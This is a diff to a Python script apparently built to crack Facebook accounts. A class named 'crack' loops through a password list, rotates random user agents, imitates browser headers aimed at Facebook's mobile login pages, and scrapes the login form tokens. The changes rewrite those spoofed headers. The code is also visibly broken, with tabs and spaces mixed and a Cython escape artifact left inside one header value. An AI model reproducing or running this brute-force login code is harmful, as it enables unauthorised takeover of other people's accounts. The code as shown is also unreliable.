@@ -292,23 +292,27 @@ class crack:
             for pws in password:
 		ua = random.choice(ugen)
 		ua2 = random.choice(ugen2)
+		    
 		#self.useragent = self.realme_useragent(total = 1)
 		
-                with requests.Session() as r:
-                    r.headers.update({
-                        'connection': 'keep-alive',
-                        'accept-language': 'id,en-US;q=0.9,en;q=0.8',
-                        'sec-fetch-mode': 'navigate',
-                        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
-                        'sec-fetch-sest': 'document',
-                        'sec-fetch-site': 'none',
-                        'cache-control': 'max-age=0',
-                        'sec-fetch-user': '?1',
-                        'upgrade-insecure-requests': '1',
-                        'host': 'm.alpha.facebook.com',
-                        'user-agent': ua,ua2
-                    })
-                    response = r.get('https://m.alpha.facebook.com/login.php?').text
+                    with requests.Session() as r:
+			r.headers.update({
+			    'Host': 'mbasic.facebook.com',
+			    'cache-control': 'max-age=0',
+			    'upgrade-insecure-requests': '1',
+			    'origin': 'https://mbasic.facebook.com',
+			    'content-type': 'application/x-www-form-urlencoded',
+			    'user-agent': ua,
+			    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+			    'sec-fetch-site': 'same-origin',
+			    'sec-fetch-mode': 'cors',
+			    'sec-fetch-user': 'empty',
+			    'sec-fetch-dest': 'document',
+			    'referer': 'https://mbasic.facebook.com/login/?email='+idf,
+			    'accept-encoding':'gzip, deflate br',
+			    'accept-language':'en-GB,en-US;q=0.9,en;q=0.8'})
+                    			
+		response = r.get('https://m.alpha.facebook.com/login.php?').text
                     try:
                         self.jazoest = re.search('name="jazoest" value="(\d+)"', str(response)).group(1)
                         self.m_ts = re.search('name="m_ts" value="(.*?)"', str(response)).group(1)
